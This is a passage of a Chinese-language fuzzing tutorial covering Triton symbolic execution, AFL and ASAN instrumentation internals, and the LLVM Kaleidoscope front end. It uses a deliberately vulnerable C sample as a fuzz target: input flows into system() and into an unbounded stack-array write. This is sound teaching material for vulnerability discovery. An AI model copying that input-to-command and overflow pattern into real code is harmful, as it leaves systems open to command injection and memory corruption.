            if make_input_data_index in try_list or make_input_data_index in history_data :
                continue

            try_list.append(make_input_data_index)

</code></pre>
<p>程序运行结果如下:</p>
<p><img src="pic7/pic4.png" alt="" /></p>
<p>现在回来对代码进行分析,我们看到下面的代码:</p>
<pre><code class="language-python">
def init_context(input_data) :
    Triton.concretizeAllRegister()  #  clean register record
    Triton.concretizeAllMemory()    #  clean memory record

</code></pre>
<p>在Triton 尝试符号执行时首先要把寄存器布局和内存布局的记录全部清空,然后再对内存进行初始值的设定:</p>
<pre><code class="language-python">
    #  设置输入内存的值
    for input_data_address,input_data_value in input_data.items() :
        Triton.setConcreteMemoryValue(input_data_address,input_data_value)  #  input data buffer .
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address, CPUSIZE.BYTE))
        Triton.convertMemoryToSymbolicVariable(MemoryAccess(input_data_address+1, CPUSIZE.BYTE))

    #  设置_serial_buffer 的值
    Triton.setConcreteMemoryValue(0x100001000, 0x31)  #  Setting data for global data string .
    Triton.setConcreteMemoryValue(0x100001000, 0x3e)
    Triton.setConcreteMemoryValue(0x100001000, 0x3d)
    Triton.setConcreteMemoryValue(0x100001000, 0x26)
    Triton.setConcreteMemoryValue(0x100001000, 0x31)

    #  初始化寄存器的值
    Triton.setConcreteRegisterValue(Triton.registers.rdi, 0x1000)  #  RDI is input buffer .
    Triton.setConcreteRegisterValue(Triton.registers.rsp, 0x7fffffff)
    Triton.setConcreteRegisterValue(Triton.registers.rbp, 0x7fffffff)

</code></pre>
<p>初始值设置完成之后,接下来就调用<code>run()</code> 执行分析:</p>
<pre><code class="language-python">
def run(eip_address) :
    while eip_address in function_code :
        #print 'Current Address:',hex(eip_address)
        instruction_data = Instruction()

        instruction_data.setOpcode(function_code[eip_address])
        instruction_data.setAddress(eip_address)

        Triton.processing(instruction_data)

        eip_address = Triton.getRegisterAst(Triton.registers.rip).evaluate()  #  执行指令并获取下一个跳转地址

</code></pre>
<p><code>get_path()</code> 则是我们对程序判断(<code>cmp edx,esi</code>) 的求解过程,精简<code>get_path()</code> 的原理如下:</p>
<pre><code class="language-python">

def get_path() :
    code_stream_record_list = Triton.getPathConstraints()  #  获取程序执行的全部符号执行结果
    ast_context = Triton.getAstContext()

    for code_stream_record_index in code_stream_record_list :
        if not code_stream_record_index.isMultipleBranches() :  #  判断是不是多分支结构
            continue

        branch_list = code_stream_record_index.getBranchConstraints()  #  获取分析内容

        for branch_index in branch_list :
            models = Triton.getModel(ast_context.land([last_branch,branch_index['constraint']]))  #  对分支进行求解

            for models_address_index,models_value_index in models.items() :  #  获取求解数据
                symblo = Triton.getSymbolicVariableFromId(models_address_index)
                temp_data[symblo.getOrigin()] = models_value_index.getValue()

        last_branch = ast_context.land([last_branch,code_stream_record_index.getTakenPathConstraintAst()])

    Triton.clearPathConstraints()  #  清除所有执行记录

</code></pre>
<p>我们输出<code>get_path()</code> 执行的内容看看:</p>
<p><img src="pic7/pic5.png" alt="" /></p>
<p>可以看到,输出的内容是经过优化之后的SMT 表达式,z3 最后根据这些表达试来求解出对应的结果.</p>
<h2 id="程序插桩与代码覆盖率"><a class="header" href="#程序插桩与代码覆盖率">程序插桩与代码覆盖率</a></h2>
<p>讲述程序插桩这章,我们继续沿用第六章的示例代码来进行分析:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;


enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};

void execute_command(const unsigned char* command) {
    system(command);
}

void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}

int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}

</code></pre>
<p>在此,如果我们要对这段代码进行Fuzzing ,那么Fuzzing 入口是<code>buffer_resolver()</code> ,如果要用libFuzzer 对它进行Fuzzing ,代码如下:</p>
<pre><code class="language-c++">
extern &quot;C&quot; int LLVMFuzzerTestOneInput(const unsigned char* data,unsigned int size) {
	return buffer_resolver(data);
}

</code></pre>
<p>这样对于Fuzzing buffer_resolver() 函数是一个简单粗暴的方法,那么AFL 对程序进行插桩的原理是怎么样的呢?我们先来分析一下程序执行图</p>
<p><img src="pic6/pic13.png" alt="" /></p>
<p>可以看到,对于buffer[1] 的检查涵盖了三个判断语句,对于buffer[0] 的检查也涵盖了一个语句.那么要对程序进行插住分析,关键的一点是在函数入口点和函数内部的判读结构进行插桩,在此记录程序的执行状态.我们先来看看AFL 的实现:</p>
<pre><code class="language-c">
static const u8* trampoline_fmt_32 =
  &quot;\n&quot;
  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;
  &quot;\n&quot;
  &quot;.align 4\n&quot;
  &quot;\n&quot;
  &quot;leal -16(%%esp), %%esp\n&quot;
  &quot;movl %%edi,  0(%%esp)\n&quot;    //  movl 的意思刚好和mov 相反,是edi 赋值给(esp + 0) 而不是esp 赋值给edi
  &quot;movl %%edx,  4(%%esp)\n&quot;
  &quot;movl %%ecx,  8(%%esp)\n&quot;
  &quot;movl %%eax, 12(%%esp)\n&quot;
  &quot;movl $0x%08x, %%ecx\n&quot;      //  这里填充的数字是当前代码块的id
  &quot;call __afl_maybe_log\n&quot;
  &quot;movl 12(%%esp), %%eax\n&quot;
  &quot;movl  8(%%esp), %%ecx\n&quot;
  &quot;movl  4(%%esp), %%edx\n&quot;
  &quot;movl  0(%%esp), %%edi\n&quot;
  &quot;leal 16(%%esp), %%esp\n&quot;
  &quot;\n&quot;
  &quot;/* --- END --- */\n&quot;
  &quot;\n&quot;;

//  省略多余代码

static void add_instrumentation(void) {  //  AFL instrutment code in /afl-as.c:221
	///  ....

	  if (line[1] == 'j' &amp;&amp; line[2] != 'm' &amp;&amp; R(100) &lt; inst_ratio) {  //  TIPS!
	    //  not jmp ,is jnz jz jq jng ...
	    printf(&quot;insert code -- line=%s inst_ratio=%d \n&quot;,line,inst_ratio);
	    fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,
	            R(MAP_SIZE));

	    ins_lines++;
      }

    ///  ....
}

</code></pre>
<p>注释TIPS 中的判断,指的是遍历gcc 编译的.S 文件(afl 的插桩原理是通过GCC 在汇编阶段中调用as 命令来进行汇编,然后在获取到程序代码编译之后的/S 文件来进行逐行解析指令内容)中的指令是不是jz /jnz /jg 这些指令(也就是除了jmp 之外的跳转指令),然后在此下方插入插桩代码.<code>trampoline_fmt_32</code> 的代码是指,获取EDI EDX ECX EAX 的值保存到栈中,然后传递给<code>__afl_maybe_log()</code> 保存执行记录.我们把示例函数用clang 和afl-clang 编译,然后在IDA 上观察.</p>
<p>Clang 编译的结果:</p>
<p><img src="pic7/pic7.png" alt="" /></p>
<p>afl-clang 的编译结果(注意,RCX 中保存的是当前块的ID ):</p>
<p><img src="pic7/pic6.png" alt="" /></p>
<p>可以看到,用afl-clang 编译出来的二进制程序在条件判断跳转指令的下方插入了获取寄存器信息的记录代码,我们再来看看<code>__afl_maybe_log()</code> 函数的源码:</p>
<pre><code class="language-c">
static const u8* main_payload_32 =

  &quot;\n&quot;
  &quot;/* --- AFL MAIN PAYLOAD (32-BIT) --- */\n&quot;
  &quot;\n&quot;
  &quot;.text\n&quot;
  &quot;.att_syntax\n&quot;
  &quot;.code32\n&quot;
  &quot;.align 8\n&quot;
  &quot;\n&quot;

  &quot;__afl_maybe_log:\n&quot;  //  __afl_maybe_log() 函数入口点
  &quot;\n&quot;
  &quot;  lahf\n&quot;
  &quot;  seto %al\n&quot;
  &quot;\n&quot;
  &quot;  /* Check if SHM region is already mapped. */\n&quot;
  &quot;\n&quot;
  &quot;  movl  __afl_area_ptr, %edx\n&quot;  //  获取__afl_area_ptr 指针
  &quot;  testl %edx, %edx\n&quot;
  &quot;  je    __afl_setup\n&quot;   //  判断获取__afl_area_ptr 是否为空,如果为空就调用__afl_setup 初始化
  &quot;\n&quot;
  &quot;__afl_store:\n&quot;      //  __afl_store() 函数入口点
  &quot;\n&quot;
  &quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;
  &quot;     is a double-XOR way of doing this without tainting another register,\n&quot;
  &quot;     and we use it on 64-bit systems; but it's slower for 32-bit ones. */\n&quot;
  &quot;\n&quot;
#ifndef COVERAGE_ONLY
  &quot;  movl __afl_prev_loc, %edi\n&quot;  //  获取__afl_prev_loc 的数据,这里保存的之前执行的代码路径记录
  &quot;  xorl %ecx, %edi\n&quot;            //  把当前执行到的代码块位置和__afl_prev_loc 的结果进行运算
  &quot;  shrl $1, %ecx\n&quot;              //
  &quot;  movl %ecx, __afl_prev_loc\n&quot;  //  保存结果到__afl_prev_loc ,它的意义在于,当我们执行不同的分支路径,通过对这些代码块的id 进行位运算来识别当前程序是不是相同的执行路径
#else
  &quot;  movl %ecx, %edi\n&quot;
#endif /* ^!COVERAGE_ONLY */
  &quot;\n&quot;
#ifdef SKIP_COUNTS
  &quot;  orb  $1, (%edx, %edi, 1)\n&quot;
#else
  &quot;  incb (%edx, %edi, 1)\n&quot;
#endif /* ^SKIP_COUNTS */
  &quot;\n&quot;
  &quot;__afl_return:\n&quot;
  &quot;\n&quot;
  &quot;  addb $127, %al\n&quot;
  &quot;  sahf\n&quot;
  &quot;  ret\n&quot;  //  退出__afl_maybe_log
  &quot;\n&quot;
  &quot;.align 8\n&quot;

</code></pre>
<p>所以,每次当代码执行到这个路径中的代码块的位置时,AFL 在程序中插桩的代码都可以检测到具体执行到的代码位置并计算执行路径.在对程序进行Fuzzing 的一个重要指标就是代码覆盖率,你的Fuzzing 策略和变异的数据可以触发更多的代码路径,那么就更能够发现隐藏的漏洞.</p>
<p><img src="pic7/pic8.png" alt="" /></p>
<p>从图中可以明白,如果测试样本只能覆盖Iteration1 和Iteration2 的话,那么Program 下除此之外位置的代码都是无法被执行到的,假定现在有5 个漏洞,以目前能Fuzzing 的代码覆盖率只能检测到3 个漏洞,另外2 个漏洞无法被检测出来,前面几章一直强调提高代码覆盖率的意义就在此.</p>
<p>程序插桩除了检测代码覆盖率之外,也可以对指针越界进行检查,我们以ASAN 为例子,这是一段示例代码:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;

int main(int argv,char** argc) {
        char* buffer = (char*)malloc(10);

        *(int *)&amp;buffer[4] = 0xAAAAAAAA;
        free(buffer);

        return 0;
}

</code></pre>
<p>在不启用ASAN 的情况下编译,LLVM IR 代码如下:</p>
<pre><code class="language-llvm">
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = call i8* @malloc(i64 10) #3               #  从malloc() 中分配内存
  store i8* %7, i8** %6, align 8
  %8 = load i8*, i8** %6, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 4  #  获取数组位置
  %10 = bitcast i8* %9 to i32*                   #  转换1 字节数组成4 字节
  store i32 -1431655766, i32* %10, align 4       #  保存数据到这里
  %11 = load i8*, i8** %6, align 8
  call void @free(i8* %11)
  ret i32 0
}

</code></pre>
<p>在启用ASAN 的情况下编译,LLVM IR 代码如下:</p>
<pre><code class="language-llvm">
define i32 @main(i32 %argv, i8** %argc) #0 {
  %retval = alloca i32, align 4
  %argv.addr = alloca i32, align 4
  %argc.addr = alloca i8**, align 8
  %buffer = alloca i8*, align 8
  store i32 0, i32* %retval, align 4
  store i32 %argv, i32* %argv.addr, align 4
  store i8** %argc, i8*** %argc.addr, align 8
  %1 = bitcast i8** %buffer to i8*
  call void @llvm.lifetime.start.p0i8(i64 8, i8* %1) #4
  %call = call i8* @malloc(i64 10) #5                     #  从malloc() 中分配内存
  store i8* %call, i8** %buffer, align 8
  %2 = load i8*, i8** %buffer, align 8
  %arrayidx = getelementptr inbounds i8, i8* %2, i64 4    #  获取数组第四个元素
  %3 = bitcast i8* %arrayidx to i32*                      #  转换1 字节数组成4 字节
                                                          #  /-- AddressSanitizer::instrumentAddress()
  %4 = ptrtoint i32* %3 to i64                            #  |  获取数组地址对应内容
                                                          #  |--/-- AddressSanitizer::memToShadow()
  %5 = lshr i64 %4, 3                                     #  |  |
  %6 = or i64 %5, 17592186044416                          #  |  |  计算数组在Shadow 表中的位置
                                                          #  |--\-- AddressSanitizer::memToShadow()
  %7 = inttoptr i64 %6 to i8*                             #  |  计算Shadow 表中的数据指针位置
  %8 = load i8, i8* %7                                    #  |  从Shadow 表中获取数据
  %9 = icmp ne i8 %8, 0                                   #  |  判断指针是否为空
  br i1 %9, label %10, label %16, !prof !3                #  |  判断跳转
                                                          #  |
; &lt;label&gt;:10:                                     ; preds = %0
                                                          #  |--/-- AddressSanitizer::createSlowPathCmp()
  %11 = and i64 %4, 7                                     #  |  |  (1 &lt;&lt; kDefaultShadowScale) - 1
  %12 = add i64 %11, 3                                    #  |  |  计算写入数据的指针位置
  %13 = trunc i64 %12 to i8                               #  |  |
  %14 = icmp sge i8 %13, %8                               #  |  |  判断是否越界,这个是&gt;= 判断,对比写入数据指针是否超过了Buffer 的上标界限
                                                          #  |--\-- AddressSanitizer::createSlowPathCmp()
  br i1 %14, label %15, label %16                         #  |

; &lt;label&gt;:15:                                     ; preds = %10
                                                          #  |--/-- AddressSanitizer::generateCrashCode(）
  call void @__asan_report_store4(i64 %4)                 #  |  |  显示ASAN 报告详细错误
  call void asm sideeffect &quot;&quot;, &quot;&quot;()                       #  |  |
  unreachable                                             #  |  |
                                                          #  |--\-- AddressSanitizer::generateCrashCode()
                                                          #  \-- AddressSanitizer::instrumentAddress()

; &lt;label&gt;:16:                                     ; preds = %10, %0
  store i32 -1431655766, i32* %3, align 4
  %17 = load i8*, i8** %buffer, align 8
  call void @free(i8* %17)
  %18 = bitcast i8** %buffer to i8*
  call void @llvm.lifetime.end.p0i8(i64 8, i8* %18) #4
  ret i32 0
}

</code></pre>
<p>ASAN 的代码插桩逻辑代码如下:</p>
<pre><code class="language-c++">
Value *AddressSanitizer::createSlowPathCmp(IRBuilder&lt;&gt; &amp;IRB, Value *AddrLong,
                                           Value *ShadowValue,
                                           uint32_t TypeSize) {
  size_t Granularity = static_cast&lt;size_t&gt;(1) &lt;&lt; Mapping.Scale;
  // Addr &amp; (Granularity - 1)
  Value *LastAccessedByte =
      IRB.CreateAnd(AddrLong, ConstantInt::get(IntptrTy, Granularity - 1));
  // (Addr &amp; (Granularity - 1)) + size - 1
  if (TypeSize / 8 &gt; 1)
    LastAccessedByte = IRB.CreateAdd(
        LastAccessedByte, ConstantInt::get(IntptrTy, TypeSize / 8 - 1));
  // (uint8_t) ((Addr &amp; (Granularity-1)) + size - 1)
  LastAccessedByte =
      IRB.CreateIntCast(LastAccessedByte, ShadowValue-&gt;getType(), false);
  // ((uint8_t) ((Addr &amp; (Granularity-1)) + size - 1)) &gt;= ShadowValue
  return IRB.CreateICmpSGE(LastAccessedByte, ShadowValue);
}

Value *AddressSanitizer::memToShadow(Value *Shadow, IRBuilder&lt;&gt; &amp;IRB) {  //  计算Shadow 表位置
  // Shadow &gt;&gt; scale
  Shadow = IRB.CreateLShr(Shadow, Mapping.Scale);  //  插入LShr 指令
  if (Mapping.Offset == 0) return Shadow;
  // (Shadow &gt;&gt; scale) | offset
  Value *ShadowBase;                          //  计算Shadow 表的基地址
  if (LocalDynamicShadow)
    ShadowBase = LocalDynamicShadow;
  else
    ShadowBase = ConstantInt::get(IntptrTy, Mapping.Offset);  //  kDefaultShadowOffset64 = 1ULL &lt;&lt; 44;
  if (Mapping.OrShadowOffset)
    return IRB.CreateOr(Shadow, ShadowBase);  //  插入Or 指令
  else
    return IRB.CreateAdd(Shadow, ShadowBase);
}

void AddressSanitizer::instrumentAddress(Instruction *OrigIns,
                                         Instruction *InsertBefore, Value *Addr,
                                         uint32_t TypeSize, bool IsWrite,
                                         Value *SizeArgument, bool UseCalls,
                                         uint32_t Exp) {  //  插桩逻辑函数
  IRBuilder&lt;&gt; IRB(InsertBefore);
  Value *AddrLong = IRB.CreatePointerCast(Addr, IntptrTy);  //  获取buffer 指针位置
  size_t AccessSizeIndex = TypeSizeToSizeIndex(TypeSize);   //  计算访问内存的大小

  if (UseCalls) {  //  UseCalls 的方式是指在不插桩下直接调用ASAN 内部函数进行检测
    if (Exp == 0)
      IRB.CreateCall(AsanMemoryAccessCallback[IsWrite][0][AccessSizeIndex],
                     AddrLong);
    else
      IRB.CreateCall(AsanMemoryAccessCallback[IsWrite][1][AccessSizeIndex],
                     {AddrLong, ConstantInt::get(IRB.getInt32Ty(), Exp)});
    return;
  }

  Type *ShadowTy =
      IntegerType::get(*C, std::max(8U, TypeSize &gt;&gt; Mapping.Scale));  //  kDefaultShadowScale = 3
  Type *ShadowPtrTy = PointerType::get(ShadowTy, 0);
  Value *ShadowPtr = memToShadow(AddrLong, IRB);  //  计算buffer 在Shadow 表中的位置
  Value *CmpVal = Constant::getNullValue(ShadowTy);
  Value *ShadowValue =
      IRB.CreateLoad(IRB.CreateIntToPtr(ShadowPtr, ShadowPtrTy));  //  从Shadow 表中加载数据

  Value *Cmp = IRB.CreateICmpNE(ShadowValue, CmpVal);  //  构造判断语句
  size_t Granularity = 1ULL &lt;&lt; Mapping.Scale;
  Instruction *CrashTerm = nullptr;

  if (ClAlwaysSlowPath || (TypeSize &lt; 8 * Granularity)) {
    // We use branch weights for the slow path check, to indicate that the slow
    // path is rarely taken. This seems to be the case for SPEC benchmarks.
    Instruction *CheckTerm = SplitBlockAndInsertIfThen(
        Cmp, InsertBefore, false, MDBuilder(*C).createBranchWeights(1, 100000));  //  为前面的cmp 判断创建分支代码块
    assert(cast&lt;BranchInst&gt;(CheckTerm)-&gt;isUnconditional());
    BasicBlock *NextBB = CheckTerm-&gt;getSuccessor(0);
    IRB.SetInsertPoint(CheckTerm);
    Value *Cmp2 = createSlowPathCmp(IRB, AddrLong, ShadowValue, TypeSize);
    if (Recover) {
      CrashTerm = SplitBlockAndInsertIfThen(Cmp2, CheckTerm, false);
    } else {
      BasicBlock *CrashBlock =
        BasicBlock::Create(*C, &quot;&quot;, NextBB-&gt;getParent(), NextBB);
      CrashTerm = new UnreachableInst(*C, CrashBlock);
      BranchInst *NewTerm = BranchInst::Create(CrashBlock, NextBB, Cmp2);
      ReplaceInstWithInst(CheckTerm, NewTerm);
    }
  } else {
    CrashTerm = SplitBlockAndInsertIfThen(Cmp, InsertBefore, !Recover);
  }

  Instruction *Crash = generateCrashCode(CrashTerm, AddrLong, IsWrite,
                                         AccessSizeIndex, SizeArgument, Exp);
  Crash-&gt;setDebugLoc(OrigIns-&gt;getDebugLoc());
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="10-玩转llvm"><a class="header" href="#10-玩转llvm">10. 玩转LLVM</a></h1>
<ul>
<li><a href="8.llvm.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="8.llvm.html#llvm-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86">LLVM 架构原理</a></li>
<li><a href="8.llvm.html#llvm-%E5%89%8D%E7%AB%AF">LLVM 前端</a></li>
<li><a href="8.llvm.html#llvm-ir-%E7%AE%80%E4%BB%8B">LLVM IR 简介</a></li>
<li><a href="8.llvm.html#llvm-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4">LLVM 基本命令</a></li>
<li><a href="8.llvm.html#%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3observer-llvm-%E5%8E%9F%E7%90%86">深入了解Observer-LLVM 原理</a></li>
<li><a href="8.llvm.html#llvm-instrument-%E6%A8%A1%E5%9D%97">LLVM Instrument 模块</a></li>
<li><a href="8.llvm.html#llvm-analayis-%E6%A8%A1%E5%9D%97">LLVM Analayis 模块</a></li>
</ul>
<h2 id="必备工具-7"><a class="header" href="#必备工具-7">必备工具</a></h2>
<p>clang ,LLVM 源码</p>
<h2 id="llvm-架构原理"><a class="header" href="#llvm-架构原理">LLVM 架构原理</a></h2>
<p>前面第五章已经提到了LLVM 的架构,主要分为三部分:前端,优化器和后端.</p>
<p><img src="pic8/pic1.png" alt="" /></p>
<h2 id="llvm-前端"><a class="header" href="#llvm-前端">LLVM 前端</a></h2>
<p>LLVM 前端的作用是把指定的语言序列化转换为LLVM IR (LLVM 中间语言).我们用LLVM 官方例子来做示例:</p>
<pre><code class="language-txt">
# Compute the x'th fibonacci number.
def fib(x)
  if x &lt; 3 then
    1
  else
    fib(x-1)+fib(x-2)

# This expression will compute the 40th number.
fib(40)

</code></pre>
<p>这是一段类似Python 语法的代码,那么首先就要把这段代码做词法分析:</p>
<pre><code class="language-c++">
enum Token {    // 语法Token 标志
  tok_eof = -1,

  // commands
  tok_def = -2,
  tok_extern = -3,

  // primary
  tok_identifier = -4,
  tok_number = -5
};

static std::string IdentifierStr; // Filled in if tok_identifier
static double NumVal;             // Filled in if tok_number

static int gettok() {  //  解析语法token
  static int LastChar = ' ';

  // Skip any whitespace.
  while (isspace(LastChar))  //  忽略空格
    LastChar = getchar();

  if (isalpha(LastChar)) { // identifier: [a-zA-Z][a-zA-Z0-9]*  , 遇到字符串
    IdentifierStr = LastChar;
    while (isalnum((LastChar = getchar())))
      IdentifierStr += LastChar;   //  拼接字符串

    if (IdentifierStr == &quot;def&quot;)    //  如果当前这个标识符是def =&gt; def asd() :
      return tok_def;              //  返回tok_def 标志
    if (IdentifierStr == &quot;extern&quot;) //  如果是extern =&gt; extern ???
      return tok_extern;
    return tok_identifier;         //  如果不是关键字def 和extern 的话,那就识别为字符串
  }

  if (isdigit(LastChar) || LastChar == '.') {  // Number: [0-9.]+  ,如果是数字,组合示例(3,4.)
    std::string NumStr;
    do {
      NumStr += LastChar;
      LastChar = getchar();
    } while (isdigit(LastChar) || LastChar == '.');

    NumVal = strtod(NumStr.c_str(), nullptr);  //  字符串转浮点数
    return tok_number;
  }

  if (LastChar == '#') {  //  这是注释..
    // Comment until end of line.
    do
      LastChar = getchar();
    while (LastChar != EOF &amp;&amp; LastChar != '\n' &amp;&amp; LastChar != '\r');

    if (LastChar != EOF)
      return gettok();
  }

  // Check for end of file.  Don't eat the EOF.
  if (LastChar == EOF)  //  文件结束
    return tok_eof;

  // Otherwise, just return the character as its ascii value.
  int ThisChar = LastChar;
  LastChar = getchar();
  return ThisChar;
}

</code></pre>
<p><code>gettok()</code> 函数主要是对代码不断进行词法分析,我们还需要一个函数来调用它构造抽象语法树:</p>
<pre><code class="language-c++">
static int CurTok;
static int getNextToken() { return CurTok = gettok(); }


static void HandleDefinition() {  //  处理声明函数的回调函数
  if (ParseDefinition()) {
    fprintf(stderr, &quot;Parsed a function definition.\n&quot;);
  } else {
    // Skip token for error recovery.
    getNextToken();
  }
}

static void HandleExtern() {  //  处理引用外部函数的回调函数
  if (ParseExtern()) {
    fprintf(stderr, &quot;Parsed an extern\n&quot;);
  } else {
    // Skip token for error recovery.
    getNextToken();
  }
}

static void HandleTopLevelExpression() {  //  处理赋值表达式的回调函数
  // Evaluate a top-level expression into an anonymous function.
  if (ParseTopLevelExpr()) {
    fprintf(stderr, &quot;Parsed a top-level expr\n&quot;);
  } else {
    // Skip token for error recovery.
    getNextToken();
  }
}

/// top ::= definition | external | expression | ';'
static void MainLoop() {  //  解析代码转换AST 函数
  while (true) {
    fprintf(stderr, &quot;ready&gt; &quot;);
    switch (CurTok) {
    case tok_eof:
      return;
    case ';': // ignore top-level semicolons.
      getNextToken();
      break;
    case tok_def:
      HandleDefinition();
      break;
    case tok_extern:
      HandleExtern();
      break;
    default:
      HandleTopLevelExpression();
      break;
    }
  }
}

</code></pre>
<p><code>HandleDefinition()</code> 里面还调用了<code>ParseDefinition()</code> 函数,这是进一步解析函数结构的代码:</p>
<pre><code class="language-c++">
/// ExprAST - Base class for all expression nodes.
class ExprAST {  //  基础表达式
public:
  virtual ~ExprAST() = default;
};

/// PrototypeAST - This class represents the &quot;prototype&quot; for a function,
/// which captures its name, and its argument names (thus implicitly the number
/// of arguments the function takes).
class PrototypeAST {  //  函数参数AST
  std::string Name;
  std::vector&lt;std::string&gt; Args;

public:
  PrototypeAST(const std::string &amp;Name, std::vector&lt;std::string&gt; Args)
      : Name(Name), Args(std::move(Args)) {}

  const std::string &amp;getName() const { return Name; }
};

/// FunctionAST - This class represents a function definition itself.
class FunctionAST {  //  函数AST
  std::unique_ptr&lt;PrototypeAST&gt; Proto;
  std::unique_ptr&lt;ExprAST&gt; Body;

public:
  FunctionAST(std::unique_ptr&lt;PrototypeAST&gt; Proto,
              std::unique_ptr&lt;ExprAST&gt; Body)
      : Proto(std::move(Proto)), Body(std::move(Body)) {}
};

/// prototype
///   ::= id '(' id* ')'
static std::unique_ptr&lt;PrototypeAST&gt; ParsePrototype() {
  if (CurTok != tok_identifier)
    return LogErrorP(&quot;Expected function name in prototype&quot;);

  std::string FnName = IdentifierStr;  //  解析出函数名
  getNextToken();

  if (CurTok != '(')
    return LogErrorP(&quot;Expected '(' in prototype&quot;);

  std::vector&lt;std::string&gt; ArgNames;
  while (getNextToken() == tok_identifier)  //  解析函数参数列表
    ArgNames.push_back(IdentifierStr);
  if (CurTok != ')')
    return LogErrorP(&quot;Expected ')' in prototype&quot;);

  // success.
  getNextToken(); // eat ')'.

  return llvm::make_unique&lt;PrototypeAST&gt;(FnName, std::move(ArgNames));
}

/// definition ::= 'def' prototype expression
static std::unique_ptr&lt;FunctionAST&gt; ParseDefinition() {
  getNextToken(); // eat def.
  auto Proto = ParsePrototype();  //  解析函数声明部分:函数名和参数
  if (!Proto)
    return nullptr;

  if (auto E = ParseExpression())  //  解析函数代码
    return llvm::make_unique&lt;FunctionAST&gt;(std::move(Proto), std::move(E));
  return nullptr;
}

</code></pre>
<p><code>ParseDefinition()</code> 函数通过不断的词法分析解析出抽象语法树之后,接下来就是对语法树进行LLVM IR 构建.LLVM IR 贯穿了整个LLVM 编译和优化周期,是LLVM 中重要的概念之一.我们深入介绍LLVM IR 的相关知识.</p>
<h2 id="llvm-ir-简介"><a class="header" href="#llvm-ir-简介">LLVM IR 简介</a></h2>
<p>基于上面的代码,继续修改如下:</p>
<pre><code class="language-c++">
/// PrototypeAST - This class represents the &quot;prototype&quot; for a function,
/// which captures its name, and its argument names (thus implicitly the number
/// of arguments the function takes).
class PrototypeAST {
  std::string Name;
  std::vector&lt;std::string&gt; Args;

public:
  PrototypeAST(const std::string &amp;Name, std::vector&lt;std::string&gt; Args)
      : Name(Name), Args(std::move(Args)) {}

  Function *codegen();
  const std::string &amp;getName() const { return Name; }
};

/// FunctionAST - This class represents a function definition itself.
class FunctionAST {
  std::unique_ptr&lt;PrototypeAST&gt; Proto;
  std::unique_ptr&lt;ExprAST&gt; Body;

public:
  FunctionAST(std::unique_ptr&lt;PrototypeAST&gt; Proto,
              std::unique_ptr&lt;ExprAST&gt; Body)
      : Proto(std::move(Proto)), Body(std::move(Body)) {}

  Function *codegen();
};

Function *PrototypeAST::codegen() {
  // Make the function type:  double(double,double) etc.
  std::vector&lt;Type *&gt; Doubles(Args.size(), Type::getDoubleTy(TheContext));  //  创建函数参数
  FunctionType *FT =
      FunctionType::get(Type::getDoubleTy(TheContext), Doubles, false);  //  创建LLVM 函数类型

  Function *F =
      Function::Create(FT, Function::ExternalLinkage, Name, TheModule.get());  //  创建LLVM 函数

  // Set names for all arguments.
  unsigned Idx = 0;
  for (auto &amp;Arg : F-&gt;args())  //  设置参数名字
    Arg.setName(Args[Idx++]);

  return F;
}

Function *FunctionAST::codegen() {
  // First, check for an existing function from a previous 'extern' declaration.
  Function *TheFunction = TheModule-&gt;getFunction(Proto-&gt;getName());  //  获取当前LLVM 环境中是否有同名的函数

  if (!TheFunction)
    TheFunction = Proto-&gt;codegen();  //  如果没有同名函数,那就调用PrototypeAST::codegen() 生成函数声明

  if (!TheFunction)  //  如果生成失败了..
    return nullptr;

  // Create a new basic block to start insertion into.
  BasicBlock *BB = BasicBlock::Create(TheContext, &quot;entry&quot;, TheFunction);  //  创建代码块
  Builder.SetInsertPoint(BB);  //  Builder 是LLVM IRBuilder&lt;&gt; ,用于生成LLVM IR 代码,这是设置LLVM IR 生成设置到当前BasicBlock ..

  // Record the function arguments in the NamedValues map.
  NamedValues.clear();
  for (auto &amp;Arg : TheFunction-&gt;args())  //  收集函数参数名字
    NamedValues[Arg.getName()] = &amp;Arg;

  if (Value *RetVal = Body-&gt;codegen()) {  //  函数代码生成
    // Finish off the function.
    Builder.CreateRet(RetVal);  //  为函数返回创建RET 指令

    // Validate the generated code, checking for consistency.
    verifyFunction(*TheFunction);  //  让LLVM 验证生成的代码

    return TheFunction;
  }

  // Error reading body, remove function.
  TheFunction-&gt;eraseFromParent();
  return nullptr;
}

</code></pre>
<pre><code class="language-c++">
/// NumberExprAST - Expression class for numeric literals like &quot;1.0&quot;.
class NumberExprAST : public ExprAST {
  double Val;

public:
  NumberExprAST(double Val) : Val(Val) {}

  Value *codegen() override;
};

